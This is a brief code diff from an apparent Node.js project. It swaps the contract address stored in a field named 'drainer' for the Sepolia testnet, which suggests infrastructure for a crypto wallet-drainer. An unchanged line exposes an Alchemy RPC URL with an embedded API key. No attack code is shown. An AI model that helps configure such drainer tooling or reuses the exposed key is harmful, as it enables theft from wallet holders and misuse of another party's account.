@@ -10,7 +10,7 @@ const PORT = process.env.PORT || 3003;
 const CHAINS = [
   {
     chain: sepolia,
-    drainer: '0xDD77CFe389E95b9D5e46ca56F4feE0fD0cb400B9',
+    drainer: '0x8B8544418d27c1000c942349e715293F917E30eC',
     rpc: 'https://eth-sepolia.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
   },
   {
